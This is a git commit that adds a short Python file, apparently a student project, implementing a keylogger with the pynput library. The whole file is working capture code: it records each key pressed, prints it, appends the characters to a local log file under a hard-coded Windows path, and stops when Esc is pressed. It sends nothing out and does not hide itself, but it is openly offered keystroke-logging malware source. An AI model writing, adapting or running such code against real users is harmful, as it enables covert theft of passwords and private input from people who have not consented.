eb2086629af3ffc14e8a7bef02feca0c7ef0eece
shahadcho <83578203+shahadcho@users.noreply.github.com>
2022-06-06 21:02:54 +0530

    Create keylogger s6 python.py

---
+++ keylogger s6 python.py
@@ -0,0 +1,51 @@
+
+
+
+from pynput.keyboard import Key, Listener
+
+
+keys_information = "key_log.txt"
+file_path = "C:\\Users\\shaha\\PycharmProjects\\S6keylogger"
+extend = "\\"
+file_merge = file_path + extend
+
+
+#keystroke gathering!!!!
+
+count = 0
+keys =[]
+
+def on_press(key):
+    global keys, count
+
+    print(key)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
